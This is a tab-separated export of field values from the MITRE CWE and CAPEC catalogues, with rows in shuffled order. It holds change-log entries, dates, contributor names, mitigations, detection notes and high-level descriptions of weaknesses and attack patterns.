10188	59	Updated References
15063	71	1997
14051	35	MITRE
21190	35	MITRE
21353	35	Cigital
5728	39	2014-07-30
11201	26	Operation
5691	31	1000
10737	91	Build and Compilation
9932	62	updated Relationships, Taxonomy_Mappings
15533	74	2
13908	47	Read Data
7512	46	This issue can make the software perform more slowly than intended, since the intended central data manager may have been explicitly optimized for performance or other quality characteristics.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.
10824	52	This issue might not be detected if testing is performed using a web browser, because the browser might obey the redirect and move the user to a different page before the application has produced outputs that indicate something is amiss.
8505	39	2017-11-08
10553	28	CWE Content Team
15123	80	Knowledge needed to set up a certification authority
25384	62	updated Demonstrative_Examples
13187	39	2014-06-23
18271	28	CWE Content Team
13476	39	2011-06-01
18516	35	MITRE
19287	35	MITRE
25203	28	CWE Content Team
14206	90	Language-Independent
25332	62	updated Relationships
24312	39	2017-11-08
24389	46	Assuming a user with a given identity, authorization is the process of determining whether that user can access a given resource, based on the user's privileges and any permissions or other access-control specifications that apply to the resource.             When access control checks are not applied consistently - or not at all - users are able to access data or perform actions that they should not be allowed to perform. This can lead to a wide range of problems, including information exposures, denial of service, and arbitrary code execution.
15582	28	CWE Content Team
9294	104	256
21441	35	MITRE
21102	31	699
17899	76	2018-07-31
17161	63	Unexpected State
6429	33	OWASP
11257	62	updated Alternate_Terms, Description, Name, Other_Notes, Terminology_Notes
6106	39	2013-07-17
11413	47	Hide Activities
17946	39	2008-09-08
23228	62	updated Applicable_Platforms, Causal_Nature
24427	50	Use OS-level preventative functionality. Not a complete solution.
11700	62	updated Common_Consequences, Description, Modes_of_Introduction, Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
23799	77	Manual Static Analysis - Source Code
16387	62	updated Demonstrative_Examples, Relationships
17883	81	Confidentiality
21599	101	CAPEC Content Team
16236	92	Experiment
11851	103	Primary
18459	39	2015-12-07
9307	53	The MITRE Corporation
20227	39	2017-01-19
8842	39	2012-05-11
23469	101	CAPEC Content Team
24696	28	CWE Content Team
18832	35	MITRE
9873	23	While adding general comments is very useful, some programmers tend to leave important data, such as: filenames related to the web application, old links or links which were not meant to be browsed by users, old code fragments, etc.
17257	28	CWE Content Team
11669	103	Primary
13774	76	2017-08-04
18485	35	MITRE
20001	35	MITRE
20424	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
13336	104	454
18462	39	2008-07-01
10073	62	updated Modes_of_Introduction, Other_Notes, Potential_Mitigations
12431	28	CWE Content Team
6848	79	Integrity
12582	62	updated Demonstrative_Examples, Potential_Mitigations
19917	94	Run Arbitrary Code
11824	62	updated Time_of_Introduction
11056	62	added/updated demonstrative examples
17365	62	updated Description, Name
22884	35	MITRE
16463	39	2017-11-08
13341	53	The MITRE Corporation
12120	50	Use OS-level preventative functionality. Not a complete solution.
10630	62	updated Relationships
9601	39	2014-07-30
11500	35	MITRE
23692	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
14068	62	updated Common_Consequences
7712	62	updated Applicable_Platforms, Enabling_Factors_for_Exploitation, Modes_of_Introduction, Relationships
12194	62	updated Potential_Mitigations, Related_Attack_Patterns
17482	86	https://ibreak.software/cross-site-port-attacks-xspa-part-2/
22831	100	The MITRE Corporation
21029	79	Authorization
14784	28	CWE Content Team
16789	23	An adversary distributes a link (or possibly some other query structure) with a request to a third party web server that is malformed and also contains a block of exploit code in order to have the exploit become live code in the resulting error page. When the third party web server receives the crafted request and notes the error it then creates an error message that echoes the malformed message, including the exploit. Doing this converts the exploit portion of the message into to valid language elements that are executed by the viewing browser. When a victim executes the query provided by the attacker the infected error message error message is returned including the exploit code which then runs in the victim's browser. XSS can result in execution of code as well as data leakage (e.g. session cookies can be sent to the attacker). This type of attack is especially dangerous since the exploit appears to come from the third party web server, who the victim may trust and hence be more vulnerable to deception.
10354	62	updated Time_of_Introduction
24437	72	This weakness will generally lead to undefined behavior and therefore crashes. In the case of overflows involving loop index variables, the likelihood of infinite loops is also high.
22139	66	Secure Programming for Linux and Unix HOWTO
21799	50	Assess software during development and prior to deployment to ensure that it functions as intended and without any malicious functionality.
20416	39	2017-05-03
8994	31	699
24669	77	Dynamic Analysis with Manual Results Interpretation
21386	21	PLOVER
20439	39	2017-11-08
14557	54	Medium
24990	62	updated Potential_Mitigations
22103	78	Medium
5949	35	MITRE
11467	26	Operation
12849	22	03
16404	28	CWE Content Team
14280	35	MITRE
13821	103	Primary
9390	62	updated References, Relationships, Taxonomy_Mappings
9503	95	[Identify potential DNS rebinding targets] An adversary publishes content on their own server with their own name and DNS server. Attract HTTP traffic and explore rebinding vulnerabilities in browsers, flash players of old version.
20786	69	Draft
15503	42	Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.
9886	46	This issue makes it more difficult to understand and/or maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
21033	33	David Wagner
24901	56	ChildOf
21861	101	CAPEC Content Team
14804	25	Medium
21158	35	MITRE
17343	35	MITRE
21858	36	http://www.cis.syr.edu/~wedu/Research/paper/webview_acsac2011.pdf
22673	63	Other
15641	30	Amit Klein
21134	40	The targeted application must have a bug that allows an adversary to control which code file is loaded at some juncture.
23393	50	Implementation: Perform input validation for all remote content.
22324	77	Architecture or Design Review
23611	51	2015-11-09
18326	48	07
10206	63	Read Files or Directories
19450	35	MITRE
12974	62	updated Potential_Mitigations
6276	62	updated Relationships
22080	62	updated Relationships, Relevant_Properties
17341	28	Eric Dalci
9014	62	updated Common_Consequences
23989	73	Spidering web sites for all available links
18735	62	updated Background_Details, Common_Consequences, Description, Relationships, Taxonomy_Mappings
22147	59	Updated Related_Attack_Patterns
24003	39	2008-10-14
19385	42	Remove the malicious code and start an effort to ensure that no more malicious code exists. This may require a detailed review of all code, as it is possible to hide a serious attack in only one or two lines of code. These lines may be located almost anywhere in an application and may have been intentionally obfuscated by the attacker.
11018	46	If the loop can be influenced by an attacker, this weakness could allow attackers to consume excessive resources such as CPU or memory.
21379	62	updated Common_Consequences, Relationships, Type
7309	28	CWE Content Team
24080	28	CWE Content Team
17441	39	2011-06-01
24207	26	Implementation
21590	43	Simple
13140	62	updated Time_of_Introduction
15220	44	High
17208	88	Call to Thread run() instead of start()
21462	76	2018-07-31
8571	62	updated Demonstrative_Examples, Relationships
24992	60	10
6994	39	2014-07-30
17170	28	CWE Content Team
17954	63	Execute Unauthorized Code or Commands
18019	42	While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).
20069	33	Robert Auger
10285	56	ChildOf
9830	90	C
20900	81	Confidentiality
7419	28	CWE Content Team
9939	35	Cigital
17620	62	updated Related_Attack_Patterns
13765	39	2017-11-08
7522	103	Primary
17434	62	updated Potential_Mitigations
7808	63	Other
24315	25	Low
19886	26	Architecture and Design
11248	55	CAPEC Content Team
24873	25	Low
24347	92	Explore
22751	45	Base
20313	39	2017-11-08
25396	51	2014-06-23
18747	35	MITRE
19233	28	Eric Dalci
12645	91	Architecture and Design
22908	28	CWE Content Team
13972	35	Cigital
19011	47	Gain Privileges
13655	36	http://securereality.com.au/studyinscarlett/
7795	28	CWE Content Team
8188	62	updated Relationships
16752	23	An adversary engages in pretexting behavior, assuming the role of a delivery person, to solicit information from target persons, or manipulate the target into performing an action that serves the adversary's interests. Impersonating a delivery person is an effective attack and an easy attack since not much acting is involved. Usually the hardest part is looking the part and having all of the proper credentials, papers and "deliveries" in order to be able to pull it off.
11882	45	Base
17144	91	Requirements
23936	81	Access Control
14395	26	Implementation
10637	25	High
10417	28	CWE Content Team
14459	62	updated Common_Consequences, Demonstrative_Examples
20607	21	CWE Content Team
19193	39	2017-05-03
16603	56	ChildOf
12522	28	CWE Content Team
19737	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit
11488	35	MITRE
7818	53	The MITRE Corporation
7774	35	MITRE
10009	28	CWE Content Team
15801	35	MITRE
9464	100	The MITRE Corporation
22542	39	2011-06-01
8455	35	MITRE
14851	63	Execute Unauthorized Code or Commands
13670	35	MITRE
15135	62	updated Relationships, Taxonomy_Mappings
21494	39	2010-02-16
9217	35	MITRE
8141	62	updated Relationships
8439	62	updated Description
20237	35	MITRE
10646	43	Simple
18765	85	321
17147	43	Simple
14423	28	CWE Content Team
7233	35	MITRE
18072	81	Access Control
11170	62	updated Common_Consequences
16721	31	1000
20947	62	updated Detection_Factors
20112	42	Use input validation as a defense-in-depth measure to reduce the likelihood of output encoding errors (see CWE-20).
24152	62	updated Relationships, Taxonomy_Mappings
11889	69	Draft
22547	56	ChildOf
18575	55	CAPEC Content Team
23210	100	The MITRE Corporation
18176	97	Signing Malicious Code
19818	40	An application uses SOAP-based web service api.
15391	76	2018-07-31
23057	26	Architecture and Design
7009	31	1003
14796	35	Veracode
13364	28	CWE Content Team
7474	35	MITRE
22404	81	Integrity
9059	43	Simple
14582	31	699
9895	103	Primary
10801	57	Indirect
15565	35	MITRE
16239	31	699
12639	26	Implementation
11506	86	https://buildsecurityin.us-cert.gov/daisy/bsi/articles/knowledge/principles/357.html
11696	35	MITRE
13004	62	updated Potential_Mitigations
19701	39	2012-05-11
21621	39	2008-11-24
22388	28	CWE Content Team
19409	25	Medium
22353	68	This is not a complete solution, since many buffer overflows are not related to strings.
16721	103	Primary
6179	96	2008-09-09
20548	43	Simple
18841	50	Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.
11045	39	2009-10-29
24819	62	updated Common_Consequences, Demonstrative_Examples, Observed_Examples, References, Relationships
6419	27	None: No specialized resources are required to execute this type of attack.
9543	35	MITRE
25402	90	Language-Independent
10346	39	2010-09-27
12557	62	updated Common_Consequences
18550	28	CWE Content Team
15551	35	MITRE
13496	62	updated Demonstrative_Examples, Description, Detection_Factors, Potential_Mitigations
16305	43	Simple
13922	92	Explore
9200	97	Signature Spoofing by Key Theft
14423	35	MITRE
10007	28	CWE Content Team
23770	91	Implementation
16407	63	Read Memory
11085	35	Cigital
17125	88	Trust of System Event Data
22477	81	Access Control
17912	39	2012-05-11
16708	91	Testing
23661	59	Updated Related_Attack_Patterns
24138	28	CWE Content Team
5601	79	Confidentiality
17345	81	Confidentiality
8900	39	2019-06-20
12341	28	CWE Content Team
10149	28	CWE Content Team
16589	50	Application designers can construct a 'code book' for error messages. When using a code book, application error messages aren't generated in string or stack trace form, but are cataloged and replaced with a unique (often integer-based) value 'coding' for the error. Such a technique will require helpdesk and hosting personnel to use a 'code book' or similar mapping to decode application errors/logs in order to respond to them normally.
25372	81	Integrity
9075	90	Language-Independent
12816	35	MITRE
21364	42	Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.
20979	35	MITRE
19923	38	An attacker can use a fuzzer in order to probe for a UTF-8 encoding vulnerability. The fuzzer should generate suspicious network activity.
10179	47	Execute Unauthorized Commands
14618	57	Indirect
15213	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Host-based Vulnerability Scanners – Examine configuration for flaws, verifying that audit mechanisms work, ensure host configuration meets certain predefined criteria                            Web Application Scanner                            Web Services Scanner                            Database Scanners
18240	35	MITRE
21684	59	Updated Attack_Motivation-Consequences, Description, Description Summary, References, Related_Weaknesses, Resources_Required
18619	35	MITRE
17983	42	Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.
13431	62	updated Time_of_Introduction
13174	91	Architecture and Design
8176	80	Ability to intercept and modify requests / responses
14926	28	CWE Content Team
15647	79	Availability
23047	62	updated Common_Consequences
21196	66	Federal Desktop Core Configuration
6332	81	Access Control
11187	38	Many exceptions are thrown by the application's filter modules in a short period of time. Check the logs. See if the probes are coming from the same IP address.
16313	35	MITRE
13120	39	2017-11-08
14678	81	Access Control
25131	28	CWE Content Team
5824	21	CLASP
12023	62	updated Description
8619	39	2017-11-08
22526	28	CWE Content Team
9237	28	CWE Content Team
19765	101	CAPEC Content Team
10631	77	Manual Static Analysis - Source Code
10943	39	2011-03-29
7662	62	updated Potential_Mitigations
6403	28	CWE Content Team
9244	100	The MITRE Corporation
15216	39	2011-03-29
14965	42	The recommendation that users change their passwords regularly and do not reuse passwords is universal among security experts. In order to enforce this, it is useful to have a password aging mechanism that notifies users when passwords are considered old and that requests that they replace them with new, strong passwords. In order for this functionality to be useful, however, it must be accompanied with documentation which stresses how important this practice is and which makes the entire process as simple as possible for the user.
7688	56	ChildOf
13739	62	updated Description, Other_Notes
19295	62	updated Potential_Mitigations
13497	78	Medium
22896	45	Base
16710	62	updated Applicable_Platforms
18560	26	Implementation
23890	62	updated Common_Consequences, Relationships
25219	63	Read Application Data
13255	39	2008-07-01
20476	74	2
21532	62	updated Common_Consequences
22095	23	An adversary suppresses the Border Gateway Protocol (BGP) advertisement for a route so as to render the underlying network inaccessible. The BGP protocol helps traffic move throughout the Internet by selecting the most efficient route between Autonomous Systems (AS), or routing domains. BGP is the basis for interdomain routing infrastructure, providing connections between these ASs. By suppressing the intended AS routing advertisements and/or forcing less effective routes for traffic to ASs, the adversary can deny availability for the target network.
9292	53	The MITRE Corporation
10427	35	MITRE
13238	42	Debugging information should not make its way into a production release.
7410	26	Architecture and Design
12403	50	Patch installed applications as soon as new updates become available.
9380	28	CWE Content Team
8523	62	updated Time_of_Introduction
22341	39	2017-11-08
21505	81	Other
10314	51	2018-07-31
7882	35	MITRE
22967	81	Other
22005	28	CWE Content Team
22944	35	MITRE
14859	31	1000
7023	90	Language-Independent
18968	55	CAPEC Content Team
11489	101	CAPEC Content Team
23976	62	updated Relationships
19722	28	CWE Content Team
12518	39	2014-07-30
6023	32	The Web Application Security Consortium (WASC)
7879	28	CWE Content Team
12283	35	MITRE
18949	40	The victim's browser must detect the true type of a mis-labeled scripting file and invoke the appropriate script interpreter without first performing filtering on the content.
23957	23	The software uses or accesses a file descriptor after it has been closed.
15455	35	MITRE
17002	62	updated Relationships
24747	35	MITRE
14171	103	Primary
10043	62	updated Observed_Examples
14029	44	High
23618	89	Standard
23117	101	CAPEC Content Team
6841	62	updated Common_Consequences
21828	35	MITRE
14626	39	2011-06-27
19485	62	updated Related_Attack_Patterns
12206	50	Design the communication system such that it associates proper authentication/authorization with each channel/message.
17723	85	644
21051	79	Confidentiality
9256	56	ChildOf
18397	27	None: No specialized resources are required to execute this type of attack.
21183	28	CWE Content Team
15494	39	2011-06-01
24268	39	2012-10-30
19727	62	updated Common_Consequences
22035	76	2019-09-30
6753	103	Primary
10235	91	Architecture and Design
16187	28	CWE Content Team
20943	27	A tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3, "Port Unreachable..
6998	28	CWE Content Team
23772	22	01
19099	35	MITRE
17481	56	ChildOf
24416	35	MITRE
24100	96	2018-03-07
10069	61	Draft
15653	89	Detailed
12194	35	MITRE
11233	96	2018-07-02
22695	89	Standard
12797	39	2009-05-27
21139	67	Medium
11044	57	Primary
17652	48	02
12604	28	CWE Content Team
13646	91	Implementation
25312	35	MITRE
21855	35	MITRE
11717	95	The attacker finds a buffer overflow vulnerability, crafts malicious code and injects it through an API call. The attacker can at worst execute remote code on the target host.
23192	81	Availability
13444	77	Manual Static Analysis - Source Code
15540	104	536
6151	62	updated Relationships
15285	21	PLOVER
8339	35	MITRE
11454	28	CWE Content Team
18226	73	The adversary's malicious script circumvents the httpOnly cookie attribute that prevents from hijacking the victim's session cookie directly using document.cookie and instead leverages the HTTP TRACE to catch this information from the header of the HTTP request once it is echoed back from the web server in the body of the HTTP TRACE response.
17357	56	ChildOf
19798	35	MITRE
20333	101	CAPEC Content Team
15925	39	2009-03-10
19222	35	MITRE
9041	63	Execute Unauthorized Code or Commands
23633	62	updated Relationships
25299	63	Alter Execution Logic
16801	21	PLOVER
21203	35	MITRE
22297	63	Execute Unauthorized Code or Commands
10717	28	CWE Content Team
13333	101	CAPEC Content Team
5972	39	2009-07-27
9101	101	CAPEC Content Team
14345	35	MITRE
17533	28	CWE Content Team
8406	50	Encrypt the session data associated with the session ID.
12401	77	Manual Static Analysis - Binary or Bytecode
13218	35	MITRE
11082	52	Automated white box techniques have been published for detecting hard-coded credentials for incoming authentication, but there is some expert disagreement regarding their effectiveness and applicability to a broad range of methods.
18420	28	CWE Content Team
11770	91	Operation
14145	74	1
22860	95	[Observe communication and inputs] The fuzzing attacker observes the target system looking for inputs and communications between modules, subsystems, or systems.
17683	50	Carefully control access to physical log files.
13061	35	MITRE
12959	74	1
24143	35	MITRE
25234	91	Architecture and Design
15180	92	Exploit
10882	39	2008-09-08
16449	73	Use public resources such as "SQL Injection Cheat Sheet" at http://ferruh.mavituna.com/makale/sql-injection-cheatsheet/, and try different approaches for adding logic to SQL queries.
12121	101	CAPEC Content Team
12851	104	261
14285	100	The MITRE Corporation
13628	81	Availability
11273	81	Other
13364	62	updated Common_Consequences
20198	39	2017-05-03
18163	39	2011-06-01
8006	74	2
18563	35	MITRE
16547	100	The MITRE Corporation
22169	73	Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery.
10857	46	This weakness is especially dangerous when the hash is used in security algorithms that require the one-way property to hold. For example, if an authentication system takes an incoming password and generates a hash, then compares the hash to another hash that it has stored in its authentication database, then the ability to create a collision could allow an attacker to provide an alternate password that produces the same target hash, bypassing authentication.
17640	28	CWE Content Team
18386	28	CWE Content Team
10237	35	MITRE
22250	62	updated Common_Consequences, Relationships
7786	59	Updated Related_Attack_Patterns
23285	28	CWE Content Team
9336	39	2010-02-16
6663	39	2012-10-30
16298	35	MITRE
19765	59	Updated Related_Weaknesses
20329	35	MITRE
7256	103	Primary
16496	31	1000
9714	59	Updated Related_Attack_Patterns
23733	35	MITRE
18546	23	An object contains a public static field that is not marked final, which might allow it to be modified in unexpected ways.
15472	62	updated Observed_Examples
19685	62	updated Relationships
24635	42	In Java, use the equals() method to compare objects instead of the == operator. If using ==, it is important for performance reasons that your objects are created by a static factory, not by a constructor.
12080	28	Eric Dalci
15965	28	CWE Content Team
15644	35	MITRE
16374	56	ChildOf
13760	80	To identify the files and create the symlinks during the file operation time window
6749	35	Veracode
11151	23	A software system that accepts path input in the form of multiple trailing slash ('/multiple/trailing/slash//') without appropriate validation can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.
22304	28	CWE Content Team
6713	26	Implementation
14475	28	CWE Content Team
6037	81	Confidentiality
11289	23	An ActionForm class contains a field that has not been declared private, which can be accessed without using a setter or getter.
13305	79	Confidentiality
22573	42	Do not expose file and directory information to the user.
11641	51	2014-06-23
21217	95	Since the attacker does not possess the shared secret, he initiates a second connection to the server and sends it, as challenge, the challenge received from the server on the first connection
7318	28	CWE Content Team
14161	28	CWE Content Team
17785	62	updated Observed_Examples, References, Relationships
13699	85	399
14003	56	ChildOf
19865	39	2012-05-11
8234	73	Manually probe the inputs using characters such as single quote (') that can cause XPath-releated errors, thus indicating an XPath weakness.
12979	35	MITRE
16644	35	MITRE
18354	35	MITRE
21653	62	updated Description, Name
12294	62	updated Relationships, Taxonomy_Mappings
21716	97	Manipulate Human Behavior
15186	35	MITRE
22057	78	Very High
18810	62	updated Potential_Mitigations
17189	35	MITRE
18509	86	http://blog.ivanristic.com/2010/09/introducing-canoe-context-aware-output-encoding-for-xss-prevention.html
17816	39	2008-09-08
24908	69	Draft
8942	50	Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system.
18247	31	699
13510	102	ChildOf
9498	31	699
19076	39	2010-12-13
18054	103	Primary
7340	56	ChildOf
18951	78	Medium
20237	28	CWE Content Team
7396	62	updated Related_Attack_Patterns
7826	91	Architecture and Design
9217	28	CWE Content Team
15909	79	Authorization
11316	67	Medium
15406	28	CWE Content Team
6029	73	Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc.).
6043	77	Dynamic Analysis with Automated Results Interpretation
20679	62	updated Relationships
19420	55	CAPEC Content Team
15236	56	ChildOf
23564	63	Modify Application Data
10002	66	Top 25 Series - Rank 2 - SQL Injection
21557	78	Low
15130	62	updated Related_Attack_Patterns
13016	39	2008-10-14
22957	63	Read Application Data
10453	35	MITRE
14950	31	1000
21363	88	Modification of Assumed-Immutable Data (MAID)
12767	23	The software uses a Pseudo-Random Number Generator (PRNG) that does not correctly manage seeds.
9281	100	The MITRE Corporation
24949	21	7 Pernicious Kingdoms
14024	28	CWE Content Team
10428	39	2012-10-30
21763	24	MITRE
24643	23	An adversary engages in activity to detect the version or type of OS software in a an environment by passively monitoring communication between devices, nodes, or applications. Passive techniques for operating system detection send no actual probes to a target, but monitor network or client-server communication between nodes in order to identify operating systems based on observed behavior as compared to a database of known signatures or values. While passive OS fingerprinting is not usually as reliable as active methods, it is generally better able to evade detection.
12401	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
8366	76	2019-09-30
19329	35	MITRE
22432	35	MITRE
9552	46	This could be used by an attacker to change passwords for another user, thus gaining the privileges associated with that user.
22200	89	Standard
16062	91	Implementation
17200	35	MITRE
11120	102	PeerOf
12942	35	MITRE
10803	35	MITRE
25113	73	Install or obtain access to instance of application and observe its log file format.
12331	28	CWE Content Team
18303	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
18222	79	Authorization
19024	91	Architecture and Design
18128	42	Remove comments that suggest the presence of bugs, incomplete functionality, or weaknesses, before deploying the application.
10377	59	Updated Resources_Required
10986	28	Sean Eidemiller
19208	62	updated Common_Consequences
17925	84	08
16665	42	For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.
13284	39	2009-10-29
6153	55	CAPEC Content Team
13754	23	The software performs an iteration or loop without sufficiently limiting the number of times that the loop is executed.
16246	61	Draft
15970	63	Gain Privileges or Assume Identity
19898	66	The Java(TM) Tutorial: The Java Native Interface
22448	35	MITRE
21569	61	Draft
14559	42	Ensure that there are no unaccounted for cases, when adjusting flow or values based on the value of a given variable. In switch statements, this can be accomplished through the use of the default label.
15368	32	The Open Web Application Security Project (OWASP)
19729	49	2012
18378	69	Draft
22603	35	MITRE
14127	60	12
22924	39	2009-07-27
6143	39	2012-05-11
10862	86	http://www.webappsec.org/projects/threat/classes/information_leakage.shtml
11279	31	699
7388	62	updated Relationships, Taxonomy_Mappings
24234	78	High
10334	43	Simple
23499	39	2012-10-30
10387	35	MITRE
12091	39	2017-05-03
16907	67	High
19696	63	Alter Execution Logic
25214	28	CWE Content Team
7757	35	MITRE
9518	35	MITRE
11548	28	Eric Dalci
15970	81	Confidentiality
15366	31	699
23957	67	Medium
17509	39	2008-07-01
18253	39	2008-08-15
16206	62	updated Applicable_Platforms, Causal_Nature, Modes_of_Introduction, Relationships
17567	39	2012-05-11
7618	63	DoS: Amplification
23162	43	Simple
22588	90	C
15168	28	CWE Content Team
14251	69	Incomplete
15155	90	C
14623	31	1000
11632	28	Eric Dalci
23091	88	Comparison Using Wrong Factors
7819	28	CWE Content Team
21591	35	MITRE
20755	77	Automated Static Analysis
22256	54	Medium
8414	35	MITRE
11886	40	The victim must run the targeted application, possibly using the crafted parameters that the adversary uses to identify the code to include.
8343	28	CWE Content Team
15848	56	CanAlsoBe
11052	56	ChildOf
9965	80	The attacker installs a web tool that allows scripts or the DOM model of web-based applications to be modified before they are executed in a browser. GreaseMonkey and Firebug are two examples of such tools.
8750	28	CWE Content Team
16699	26	Architecture and Design
19286	62	updated Description
9413	81	Integrity
19385	91	Testing
15191	42	Check the results of all functions that return a value and verify that the value is expected.
23097	40	The ability to install the keylogger, either in person or remote.
10970	39	2012-05-11
16087	73	Develop malicious Flash application that is injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the flash application to execute appropriately.
13094	35	MITRE
12854	73	Adversary attempts to use victim's browser as an HTTP proxy to other resources inside the target's security zone. This allows two IP addresses placed in the same security zone.
12663	39	2009-10-29
12145	78	High
6628	62	updated Relationships
11603	23	An adversary inserts malicious logic into hardware, typically in the form of a computer virus or rootkit. This logic is often hidden from the user of the hardware and works behind the scenes to achieve negative impacts. This pattern of attack focuses on hardware already fielded and used in operation as opposed to hardware that is still under development and part of the supply chain.
9320	28	CWE Content Team
13885	100	The MITRE Corporation
15462	103	Primary
14114	31	1000
7958	59	Updated Attack_Motivation-Consequences
19502	62	updated Time_of_Introduction
5695	28	CWE Content Team
8676	49	2010
17039	23	The authentication algorithm is sound, but the implemented mechanism can be bypassed as the result of a separate weakness that is primary to the authentication error.
7688	103	Primary
17271	39	2012-05-11
24140	104	280
10905	103	Primary
23455	90	Language-Independent
13692	25	High
20413	103	Primary
18743	104	66
13236	39	2009-03-10
20487	39	2011-03-29
7331	62	updated References
7286	42	Properly quote the full search path before executing a program on the system.
8920	60	16
16007	91	Implementation
18638	102	ChildOf
20100	104	231
19342	59	Updated Description Summary, Examples-Instances, Probing_Techniques
15528	28	CWE Content Team
25092	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
13461	28	CWE Content Team
17361	39	2017-11-08
18212	28	CWE Content Team
23031	66	SSRF attacks and sockets: smorgasbord of vulnerabilities
17009	63	Modify Memory
20560	62	updated Relationships
24145	90	Language-Independent
9540	103	Primary
10441	79	Confidentiality
24800	62	updated Relationships
16795	45	Base
8866	97	Manipulation During Distribution
18497	35	MITRE
14550	35	MITRE
8100	39	2012-05-11
16684	73	Pattern tests. The attacker looks for patterns (odd/even, repetition, multiples, or other arithmetic relationships) between IDs
8040	63	Other
6594	63	Read Application Data
23717	89	Detailed
8493	27	The adversary requires a variety of tools to collect information about the target. These include port/network scanners and tools to analyze responses from applications to determine version and configuration information. Footprinting a system adequately may also take a few days if the attacker wishes the footprinting attempt to go undetected.
8191	62	updated Demonstrative_Examples
13193	90	C
8095	62	updated Description, Other_Notes
8421	96	2018-07-02
9534	51	2014-06-23
17713	48	09
6032	35	MITRE
10453	39	2019-06-20
17885	23	An adversary, through a previously installed malicious application, intercepts messages from a trusted Android-based application in an attempt to achieve a variety of different objectives including denial of service, information disclosure, and data injection. An implicit intent sent from a trusted application can be received by any application that has declared an appropriate intent filter. If the intent is not protected by a permission that the malicious application lacks, then the attacker can gain access to the data contained within the intent. Further, the intent can be either blocked from reaching the intended destination, or modified and potentially forwarded along.
23091	43	Simple
18429	23	The product does not use or incorrectly uses a protection mechanism that provides sufficient defense against directed attacks against the product.
23838	35	MITRE
8418	46	The output of a random number generator should not be predictable based on observations of previous values. In some cases, an attacker cannot predict the exact value that will be produced next, but can narrow down the possibilities significantly. This reduces the amount of effort to perform a brute force attack. For example, suppose the product generates random numbers between 1 and 100, but it always produces a larger value until it reaches 100. If the generator produces an 80, then the attacker knows that the next value will be somewhere between 81 and 100. Instead of 100 possibilities, the attacker only needs to consider 20.
16487	28	CWE Content Team
12198	28	CWE Content Team
17409	21	CWE Content Team
13895	39	2015-12-07
22200	23	An adversary takes advantage of improper authentication to provide data or services under a falsified identity. The purpose of using the falsified identity may be to prevent traceability of the provided data or to assume the rights granted to another individual. One of the simplest forms of this attack would be the creation of an email message with a modified "From" field in order to appear that the message was sent from someone other than the actual sender. The root of the attack (in this case the email system) fails to properly authenticate the source and this results in the reader incorrectly performing the instructed action. Results of the attack vary depending on the details of the attack, but common results include privilege escalation, obfuscation of other attacks, and data corruption/manipulation.
14966	56	ChildOf
9761	44	SOAR Partial
7554	35	MITRE
10153	28	CWE Content Team
8248	91	Architecture and Design
18606	35	MITRE
20442	33	Tobi
8268	28	CWE Content Team
22426	62	updated References, Relationships
12684	35	MITRE
22298	59	Updated Obfuscation_Techniques, References
19412	101	CAPEC Content Team
17937	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
12101	102	ChildOf
15332	35	MITRE
16656	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Web Application Scanner                            Web Services Scanner                            Database Scanners
15404	28	CWE Content Team
12895	85	261
18354	62	updated Description, Name
7442	62	updated Demonstrative_Examples
5801	26	Architecture and Design
16811	26	Implementation
16080	42	For inbound authentication using passwords: apply strong one-way hashes to passwords and store those hashes in a configuration file or database with appropriate access control. That way, theft of the file/database still requires the attacker to try to crack the password. When handling an incoming password during authentication, take the hash of the password and compare it to the saved hash.                   Use randomly assigned salts for each separate hash that is generated. This increases the amount of computation that an attacker needs to conduct a brute-force attack, possibly limiting the effectiveness of the rainbow table method.
13817	67	High
11473	35	MITRE
6039	100	The MITRE Corporation
21762	62	updated Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
19128	62	updated Relationships
8744	21	PLOVER
6040	102	PeerOf
14367	28	CWE Content Team
11739	35	MITRE
16802	101	CAPEC Content Team
22367	31	1000
19123	27	Ability to deploy a custom hostile service for access by targeted clients. Ability to communicate synchronously or asynchronously with client machine.
21710	103	Primary
14256	35	MITRE
